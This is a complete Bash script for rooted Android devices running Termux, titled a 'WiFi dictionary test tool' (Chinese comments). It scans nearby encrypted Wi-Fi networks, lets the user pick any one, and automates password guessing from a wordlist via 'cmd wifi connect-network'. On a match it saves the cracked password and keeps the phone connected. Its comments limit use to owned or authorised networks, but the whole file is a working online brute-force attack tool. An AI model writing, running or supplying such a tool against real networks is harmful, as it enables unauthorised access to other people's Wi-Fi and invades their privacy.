#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# WiFi 字典测试工具 v3.1 (Termux + Root)
#
# 原理: 用 cmd wifi connect-network 逐个尝试字典中的密码。
#       这不是破解 WPA 加密，只是"在线猜密码"，速度受限于
#       系统的连接握手（每次约 5 秒），只对弱口令有效。
#
# 仅限用于你自己拥有或已获得授权的网络。
# ============================================================

set -uo pipefail

# sudo/su 下 PATH 可能不含 Android 系统目录。
# 追加而不是前置，避免 toybox 覆盖掉 Termux 的 GNU 工具。
export PATH="$PATH:/system/bin:/system/xbin:/system/sbin:/sbin"
umask 077

# ── 颜色 ──
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── 全局变量 ──
# 固定路径，避免 sudo 下 HOME 变化
REAL_HOME="/data/data/com.termux/files/home"
# 所有数据集中在这个目录下，不再往 home 根目录散落文件
DATA_DIR="$REAL_HOME/.wifi-crack"
DICT_DIR="$DATA_DIR/dict"
RESULT_DIR="$DATA_DIR/results"
TEMP_DIR="$DATA_DIR/tmp"
DICT_FILE="$DICT_DIR/幻影WiFi字典.txt"

# 旧版（v3.0 及更早）布局，仅用于自动迁移
LEGACY_DICT="$REAL_HOME/幻影WiFi字典.txt"
LEGACY_DICT_DIR="$REAL_HOME/wifi-dicts"
LEGACY_RESULT_DIR="$REAL_HOME/wifi-results"

CONNECT_POLLS=10     # 每次尝试轮询次数，10 × 0.5s = 5s
SCAN_WAIT=12         # 等扫描结果的最长秒数
VERBOSE=0            # 1 = 进度里显示明文密码
KEEP_ON_SUCCESS=1    # 1 = 成功后保留该网络配置（手机继续连着）
PRESERVE_CONFIG=0    # 1 = 退出清理时保留本次新建的配置

TARGET_SSID=""; TARGET_BSSID=""; TARGET_ENC=""; TARGET_FREQ=""
DICT_TOTAL=0
LAST_CMD_ERROR=""
CLEANED=0

# ── 工具函数 ──
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
error() { echo -e "${RED}[-]${NC} $*"; }
die()   { error "$*"; exit 1; }

# 只保留 [a-zA-Z0-9._-]，用于文件名
safe_name() { printf '%s' "$1" | tr -c 'a-zA-Z0-9._-' '_'; }


# ── 环境检查 ──
check_root() {
    (( EUID == 0 )) && return 0
    if command -v su &>/dev/null; then
        info "需要 root，正在提权..."
        exec su -c "$(printf '%q ' "$0" "$@")"
    fi
    die "需要 root 权限，请用 sudo 运行"
}

check_env() {
    command -v cmd &>/dev/null || die "找不到 cmd 命令（应为 /system/bin/cmd）"
    local out
    out=$(cmd wifi status 2>&1) || true
    if [[ -z "$out" || "$out" == *"Unknown command"* || "$out" == *"Exception"* ]]; then
        die "cmd wifi 不可用，请确认设备为 Android 11+ 且已 root"
    fi
}

setup_dirs() {
    # 每次启动重建临时目录，避免上次被杀掉留下的陈旧基线
    mkdir -p "$DICT_DIR" "$RESULT_DIR"
    rm -rf "$TEMP_DIR"
    mkdir -p "$TEMP_DIR"
    migrate_old_layout
}

# 把旧版散落在 home 根目录的文件收进 ~/.wifi-crack/
migrate_old_layout() {
    local f="" files=()

    if [[ ! -f "$DICT_FILE" ]]; then
        [[ -f "$LEGACY_DICT" ]] && f="$LEGACY_DICT"
        if [[ -z "$f" && -f "$LEGACY_DICT_DIR/幻影WiFi字典.txt" ]]; then
            f="$LEGACY_DICT_DIR/幻影WiFi字典.txt"
        fi
        if [[ -n "$f" ]]; then
            if mv -f "$f" "$DICT_FILE" 2>/dev/null; then
                info "已把字典迁移到 $DICT_FILE"
            else
                warn "字典迁移失败，继续使用旧路径: $f"
                DICT_FILE="$f"
            fi
        fi
    fi

    if [[ -d "$LEGACY_RESULT_DIR" ]]; then
        shopt -s nullglob
        files=("$LEGACY_RESULT_DIR"/*.txt)
        shopt -u nullglob
        if (( ${#files[@]} > 0 )); then
            if mv -f "${files[@]}" "$RESULT_DIR/" 2>/dev/null; then
                info "已把 ${#files[@]} 条历史结果迁移到 $RESULT_DIR"
            fi
        fi
        rmdir "$LEGACY_RESULT_DIR" 2>/dev/null || true
    fi

    rmdir "$LEGACY_DICT_DIR" 2>/dev/null || true
}

# ── 解析 list-networks ──
# 输出: <网络ID>\t<SSID>   （同一 SSID 的 wpa2/wpa3 行会重复，调用方去重）
# 从 stdin 解析，方便测试和复用
parse_saved() {
    awk '
        NR == 1 && /Network Id/ { next }
        {
            line = $0
            id   = $1
            ssid = line
            sub(/^[[:space:]]*[^[:space:]]+[[:space:]]+/, "", ssid)
            sub(/[[:space:]]+[^[:space:]]+[[:space:]]*$/, "", ssid)
            if (ssid != "" && id ~ /^[0-9]+$/) print id "\t" ssid
        }'
}

saved_rows() { cmd wifi list-networks </dev/null 2>/dev/null | parse_saved; }

ids_for_ssid() {
    saved_rows | awk -F'\t' -v s="$1" '$2 == s { print $1 }' | sort -u
}

# 记录基线：脚本运行前，该 SSID 已有的配置 ID
# 失败时不留 baseline_ok，后续清理会直接放弃，避免误删
snapshot_baseline() {
    local out
    out=$(cmd wifi list-networks </dev/null 2>&1) || return 1
    [[ "$out" == *"Network Id"* ]] || return 1
    printf '%s\n' "$out" | parse_saved |
        awk -F'\t' -v s="$1" '$2 == s { print $1 }' | sort -u > "$TEMP_DIR/baseline_ids"
    : > "$TEMP_DIR/baseline_ok"
}

# 只删除"本次运行新增"的配置，基线里的（用户自己的）一个都不碰
forget_new_configs() {
    local ssid="$1" id
    # 基线不完整就不删任何东西，宁可留下配置也不能误删用户的网络
    [[ -f "$TEMP_DIR/baseline_ok" && -f "$TEMP_DIR/baseline_ids" ]] || return 0
    while IFS= read -r id; do
        [[ -z "$id" ]] && continue
        grep -qxF "$id" "$TEMP_DIR/baseline_ids" 2>/dev/null && continue
        cmd wifi forget-network "$id" </dev/null >/dev/null 2>&1 || true
    done < <(ids_for_ssid "$ssid")
}

# 中断/退出时清理：不留半成品的已保存网络
cleanup() {
    (( CLEANED )) && return
    CLEANED=1
    if (( ! PRESERVE_CONFIG )) && [[ -n "$TARGET_SSID" ]]; then
        forget_new_configs "$TARGET_SSID"
    fi
    rm -rf "$TEMP_DIR"
}
trap 'echo; warn "已中断，正在清理..."; cleanup; exit 130' INT TERM
trap 'cleanup' EXIT

# ── 扫描 ──
# 从一行扫描结果取出 SSID（去掉前 4 列 + 末尾形如 [WPA2-PSK-CCMP][ESS] 的标志块）
extract_ssid() {
    local s tail head
    s=$(printf '%s' "$1" | sed -E 's/^[[:space:]]*([^[:space:]]+[[:space:]]+){4}//')
    # 只剥离"看起来像标志"的尾部块，避免误伤 MyNet[5G] 这类 SSID
    while [[ $s =~ ^(.*[^[:space:]])?[[:space:]]*(\[[^]]*\])[[:space:]]*$ ]]; do
        head=${BASH_REMATCH[1]}
        tail=${BASH_REMATCH[2]}
        if [[ $tail =~ ^\[(ESS|WPS|MFPC|MFPR|FILS|OWE|DPP|SGC|WEP|WPA[0-9A-Z+-]*|RSN[0-9A-Z+-]*|[A-Z0-9]+[-+][A-Z0-9+-]+)\]$ ]]; then
            s=$head
        else
            break
        fi
    done
    printf '%s' "$s" | sed -E 's/[[:space:]]+$//'
}

scan_wifi() {
    info "正在扫描附近 WiFi..."
    cmd wifi start-scan </dev/null >/dev/null 2>&1 || true

    local waited=0 fresh=0
    while (( waited < SCAN_WAIT )); do
        sleep 1
        waited=$((waited + 1))
        fresh=$(cmd wifi list-scan-results </dev/null 2>/dev/null |
                awk 'NR > 1 && ($4 + 0) < 1.5 { c++ } END { print c + 0 }')
        (( fresh > 0 )) && break
    done
    (( fresh > 0 )) || warn "扫描结果可能不是最新（WiFi 扫描有系统限流）"

    : > "$TEMP_DIR/networks.raw"
    local line bssid freq rssi enc ssid flags
    while IFS= read -r line; do
        [[ -z "${line//[[:space:]]/}" ]] && continue
        read -r bssid freq rssi _ <<< "$line"
        [[ "$bssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || continue

        ssid=$(extract_ssid "$line")
        # 隐藏网络 / 空 SSID 跳过；含制表符的 SSID 无法安全存储，跳过
        [[ -z "$ssid" || "$ssid" == *$'\t'* ]] && continue

        flags=$(printf '%s' "$line" | grep -oE '\[[^]]*\]' | tr '\n' ' ')
        [[ "$flags" == *WPA* || "$flags" == *WEP* || "$flags" == *PSK* || "$flags" == *SAE* ]] || continue

        enc="wpa2"
        [[ "$flags" == *WPA3* || "$flags" == *SAE* ]] && enc="wpa3"
        [[ "$flags" == *WEP* ]] && enc="wep"   # 仅展示，无法连接

        printf '%s\t%s\t%s\t%s\t%s\n' "$bssid" "$freq" "$rssi" "$enc" "$ssid" >> "$TEMP_DIR/networks.raw"
    done < <(cmd wifi list-scan-results </dev/null 2>/dev/null | tail -n +2)

    # 同一 SSID 去重，保留信号最强的一条，按信号降序
    awk -F'\t' '
        { if (!($5 in best) || $3 + 0 > best[$5]) { best[$5] = $3 + 0; line[$5] = $0 } }
        END { for (k in line) print line[k] }' "$TEMP_DIR/networks.raw" |
        sort -t$'\t' -k3,3nr > "$TEMP_DIR/networks.txt"

    local count
    count=$(wc -l < "$TEMP_DIR/networks.txt" | tr -d ' ')
    (( count > 0 )) || die "未扫描到可用的加密网络"
    info "扫描到 ${BOLD}${count}${NC} 个加密网络"
}

show_networks() {
    echo ""
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}  #   信号    加密    BSSID                SSID${NC}"
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${NC}"
    local i=1 bssid freq rssi enc ssid bars pct
    while IFS=$'\t' read -r bssid freq rssi enc ssid; do
        pct=$(( rssi + 100 ))
        if   (( pct >= 70 )); then bars="█████"
        elif (( pct >= 55 )); then bars="████░"
        elif (( pct >= 40 )); then bars="███░░"
        elif (( pct >= 25 )); then bars="██░░░"
        else                       bars="█░░░░"
        fi
        printf "  ${CYAN}%2d${NC}  %s %3d%%  %-5s %-18s %s\n" "$i" "$bars" "$pct" "$enc" "$bssid" "$ssid"
        i=$((i + 1))
    done < "$TEMP_DIR/networks.txt"
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "  ${YELLOW}注${NC}: wep 网络 cmd wifi 不支持连接，选中会被拒绝"
}

select_target() {
    local count choice line
    count=$(wc -l < "$TEMP_DIR/networks.txt" | tr -d ' ')
    while true; do
        echo -ne "\n选择目标 [1-$count, 0 返回]: "
        read -r choice || return 1
        [[ "$choice" == "0" ]] && return 1
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= count )); then
            line=$(sed -n "${choice}p" "$TEMP_DIR/networks.txt")
            TARGET_BSSID=$(echo "$line" | cut -f1)
            TARGET_FREQ=$(echo "$line" | cut -f2)
            TARGET_ENC=$(echo "$line" | cut -f4)
            TARGET_SSID=$(echo "$line" | cut -f5-)
            if [[ "$TARGET_ENC" == "wep" ]]; then
                error "该网络是 WEP，cmd wifi 只支持 open/owe/wpa2/wpa3，无法测试"
                continue
            fi
            info "目标: ${BOLD}${TARGET_SSID}${NC} (${TARGET_BSSID}) [$TARGET_ENC]"
            return 0
        fi
        error "请输入 1-$count 之间的数字"
    done
}

# ── 字典 ──
check_dict() {
    if [[ ! -f "$DICT_FILE" ]]; then
        die "字典文件不存在: $DICT_FILE
    请把字典放到该路径，或用 -t <SSID> [BSSID] [加密] <字典路径> 指定"
    fi
    DICT_TOTAL=$(awk 'END { print NR }' "$DICT_FILE")
    (( DICT_TOTAL > 0 )) || die "字典是空的: $DICT_FILE"
    info "字典: ${BOLD}$(basename "$DICT_FILE")${NC} (${DICT_TOTAL} 个密码)"
}

# ── 连接尝试 ──
# 返回 0=密码正确 1=密码错误 2=命令本身失败(参数/权限/不支持)
try_connect() {
    local ssid="$1" password="$2" bssid="$3" enc="$4"
    local -a args=( "$ssid" "$enc" "$password" )
    [[ -n "$bssid" ]] && args+=( -b "$bssid" )

    local out rc=0 i status
    out=$(cmd wifi connect-network "${args[@]}" </dev/null 2>&1) || rc=$?
    if (( rc != 0 )); then
        LAST_CMD_ERROR="$out"
        # 只有"命令被拒绝"才算致命错误；某些机型密码错误时也会返回非 0，
        # 那种情况仍要继续轮询状态，否则会误判成工具坏了。
        case "$out" in
            *Exception*|*Invalid*|*Unknown*|*"not allowed"*|*ermission*|*denied*|*Unsupported*|*sage:*)
                return 2 ;;
        esac
    fi

    for ((i = 0; i < CONNECT_POLLS; i++)); do
        sleep 0.5
        status=$(cmd wifi status </dev/null 2>/dev/null)
        [[ "$status" == *"Wifi is connected to \"$ssid\""* ]] && return 0
    done
    return 1
}

current_ssid() {
    cmd wifi status </dev/null 2>/dev/null |
        sed -n 's/.*Wifi is connected to "\([^"]*\)".*/\1/p' | head -1
}

# ── 主循环 ──
run_crack() {
    local total="$DICT_TOTAL" tried=0 found=0 start_time elapsed pct speed
    local password rc cmd_errors=0
    local result_file

    [[ -n "$TARGET_SSID" ]] || die "没有指定目标 SSID"
    [[ "$TARGET_SSID" != -* ]] || die "SSID 以 - 开头会被 cmd 当成参数，请用 -b 指定网络或手动连接"
    PRESERVE_CONFIG=0

    if [[ "$(current_ssid)" == "$TARGET_SSID" ]]; then
        die "你当前已连接 $TARGET_SSID，无需再跑字典"
    fi

    snapshot_baseline "$TARGET_SSID" ||
        die "读取已保存网络列表失败，为避免误删你的 WiFi 配置已停止（可重试）"
    result_file="$RESULT_DIR/$(safe_name "$TARGET_SSID")_$(date +%Y%m%d_%H%M%S).txt"
    start_time=$(date +%s)

    echo ""
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "  目标: ${CYAN}${TARGET_SSID}${NC}"
    echo -e "  BSSID: ${TARGET_BSSID:-（不指定，由系统选择）}"
    echo -e "  加密: ${TARGET_ENC}"
    echo -e "  字典: ${BOLD}$(basename "$DICT_FILE")${NC} (${total} 个密码)"
    echo -e "  预计: 每次约 $((CONNECT_POLLS / 2)) 秒，满字典约 $(( total * CONNECT_POLLS / 7200 )) 小时"
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${NC}"
    echo ""

    while IFS= read -r password || [[ -n "$password" ]]; do
        password=${password%$'\r'}
        [[ -z "$password" ]] && continue

        tried=$((tried + 1))
        pct=$(( tried * 100 / total ))
        elapsed=$(( $(date +%s) - start_time ))
        speed=""
        (( elapsed > 0 )) && speed=" | $(( tried / elapsed )) 个/秒"

        printf '\r\033[K%s[%3d%%]%s %d/%d%s  长度:%d' \
            "$CYAN" "$pct" "$NC" "$tried" "$total" "$speed" "${#password}" >&2
        (( VERBOSE )) && printf '  %s' "$password" >&2

        try_connect "$TARGET_SSID" "$password" "$TARGET_BSSID" "$TARGET_ENC"
        rc=$?

        if (( rc == 0 )); then
            found=1
            elapsed=$(( $(date +%s) - start_time ))
            echo "" >&2
            echo "" >&2
            echo -e "${GREEN}${BOLD}╔══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}${BOLD}║          密码匹配成功                ║${NC}"
            echo -e "${GREEN}${BOLD}╚══════════════════════════════════════╝${NC}"
            echo -e "  网络: ${BOLD}${TARGET_SSID}${NC}"
            echo -e "  密码: ${BOLD}${GREEN}${password}${NC}"
            echo -e "  尝试: ${tried}/${total}"
            echo -e "  耗时: $(date -d@"${elapsed}" -u +%H:%M:%S 2>/dev/null || echo "${elapsed} 秒")"
            {
                echo "网络: $TARGET_SSID"
                echo "BSSID: $TARGET_BSSID"
                echo "加密: $TARGET_ENC"
                echo "密码: $password"
                echo "时间: $(date)"
            } > "$result_file"
            info "结果已保存: $result_file"

            if (( KEEP_ON_SUCCESS )); then
                PRESERVE_CONFIG=1
                info "已保留该网络配置，手机应保持连接（用 --forget-on-success 可改成自动删除）"
            else
                forget_new_configs "$TARGET_SSID"
            fi
            break
        fi

        if (( rc == 2 )); then
            cmd_errors=$((cmd_errors + 1))
            if (( cmd_errors >= 3 )); then
                echo "" >&2
                die "connect-network 连续失败 ${cmd_errors} 次，已停止。
    系统返回: ${LAST_CMD_ERROR:-<空>}
    常见原因: 加密类型不支持、该 BSSID 被系统暂时拉黑、或权限不足"
            fi
        else
            cmd_errors=0
        fi

        # 清掉本次尝试产生的半成品配置（基线里的不动）
        forget_new_configs "$TARGET_SSID"
    done < "$DICT_FILE"

    echo "" >&2
    if (( found == 0 )); then
        warn "字典跑完，未匹配到密码"
        elapsed=$(( $(date +%s) - start_time ))
        info "共尝试 ${tried} 个密码，耗时 $(date -d@"${elapsed}" -u +%H:%M:%S 2>/dev/null || echo "${elapsed} 秒")"
        warn "提示：弱口令才有机会，强密码靠猜字典是猜不出来的"
    fi
}

# ── 快速模式：单个密码 ──
quick_try() {
    local ssid="$1" password="$2" enc="${3:-wpa2}"
    [[ -n "$ssid" && -n "$password" ]] || die "用法: $0 -q <SSID> <密码> [wpa2|wpa3]"
    [[ "$enc" =~ ^(open|owe|wpa2|wpa3)$ ]] || die "加密类型只能是 open/owe/wpa2/wpa3（不支持 WEP）"

    TARGET_SSID="$ssid"
    snapshot_baseline "$ssid" || die "读取已保存网络列表失败，已停止"
    info "快速尝试: ${BOLD}${ssid}${NC} / ${#password} 个字符"
    local rc=0
    try_connect "$ssid" "$password" "" "$enc" || rc=$?
    case $rc in
        0) info "${GREEN}密码正确${NC}" ;;
        1) warn "密码错误" ;;
        *) warn "连接命令失败: ${LAST_CMD_ERROR:-未知错误}" ;;
    esac
    forget_new_configs "$ssid"
    return "$rc"
}

show_results() {
    echo ""
    local files=("$RESULT_DIR"/*.txt)
    if [[ -e "${files[0]}" ]]; then
        local f
        for f in "${files[@]}"; do
            echo -e "  ${BOLD}--- $(basename "$f") ---${NC}"
            cat "$f"
            echo ""
        done
    else
        warn "没有已保存的结果"
    fi
}

# ── 菜单 ──
show_banner() {
    echo ""
    echo -e "${CYAN}${BOLD}"
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║     WiFi 字典测试工具 v3.1                 ║"
    echo "  ║     Termux + Root + cmd wifi               ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo -e "${NC}"
}

main_menu() {
    local opt
    while true; do
        echo ""
        echo -e "  ${BOLD}1${NC}. 扫描并选择目标"
        echo -e "  ${BOLD}2${NC}. 快速尝试单个密码"
        echo -e "  ${BOLD}3${NC}. 查看已保存的结果"
        echo -e "  ${BOLD}0${NC}. 退出"
        echo ""
        echo -ne "  选择: "
        read -r opt || exit 0
        case "$opt" in
            1)
                scan_wifi && show_networks && select_target && check_dict && run_crack
                ;;
            2)
                local qssid qpass qenc
                echo -ne "  SSID: "; read -r qssid || continue
                echo -ne "  密码: "; read -rs qpass || continue; echo ""
                echo -ne "  加密类型 [wpa2/wpa3, 默认 wpa2]: "; read -r qenc || continue
                quick_try "$qssid" "$qpass" "${qenc:-wpa2}"
                ;;
            3)
                show_results
                ;;
            0)
                cleanup
                info "退出"
                exit 0
                ;;
            *)
                error "无效选择"
                ;;
        esac
    done
}

usage() {
    cat <<EOF
用法:
  $0                          交互式菜单
  $0 -s | --scan              只扫描并列出
  $0 -t <SSID> [BSSID] [加密] [字典]
                              指定目标跑字典（加密默认 wpa2）
  $0 -q <SSID> <密码> [加密]   只试一个密码
  $0 -l | --list              查看已保存的结果
  $0 -h | --help              显示帮助

选项:
  -v, --verbose               进度中显示明文密码（默认打码）
  --forget-on-success         成功后删除该网络配置（默认保留并保持连接）

说明:
  - 数据和字典都在 ~/.wifi-crack/ 下（dict/ results/ tmp/），不往 home 根目录散落文件。
  - 加密类型只支持 open/owe/wpa2/wpa3；WEP 无法通过 cmd wifi 连接。
  - 脚本只会删除"本次运行新建"的网络配置，不会动你已保存的 WiFi。
  - 仅限测试你自己拥有或已获授权的网络。
EOF
}

main() {
    check_root "$@"
    check_env
    setup_dirs
    show_banner

    local arg1="${1:-}"
    if [[ -n "$arg1" ]]; then
        case "$arg1" in
            -s|--scan)
                scan_wifi; show_networks; exit 0 ;;
            -l|--list)
                show_results; exit 0 ;;
            -q|--quick)
                shift
                quick_try "${1:-}" "${2:-}" "${3:-wpa2}"; exit $? ;;
            -t|--target)
                shift
                TARGET_SSID="${1:-}"
                TARGET_BSSID="${2:-}"
                TARGET_ENC="${3:-wpa2}"
                [[ -n "${4:-}" ]] && DICT_FILE="$4"
                [[ -n "$TARGET_SSID" ]] || die "用法: $0 -t <SSID> [BSSID] [加密类型] [字典路径]"
                [[ "$TARGET_BSSID" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || {
                    [[ -n "$TARGET_BSSID" ]] && warn "BSSID 格式不对，已忽略: $TARGET_BSSID"
                    TARGET_BSSID=""
                }
                [[ "$TARGET_ENC" =~ ^(open|owe|wpa2|wpa3)$ ]] || die "加密类型只能是 open/owe/wpa2/wpa3（不支持 WEP）"
                check_dict
                run_crack; exit 0 ;;
            -v|--verbose)
                VERBOSE=1; shift
                [[ -n "${1:-}" ]] || { usage; exit 0; }
                main "$@" ;;
            --forget-on-success)
                KEEP_ON_SUCCESS=0; shift
                [[ -n "${1:-}" ]] || { usage; exit 0; }
                main "$@" ;;
            -h|--help)
                usage; exit 0 ;;
            *)
                die "未知参数: $arg1（用 -h 查看帮助）" ;;
        esac
    fi
    main_menu
}

# 允许被 source 用于测试
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi
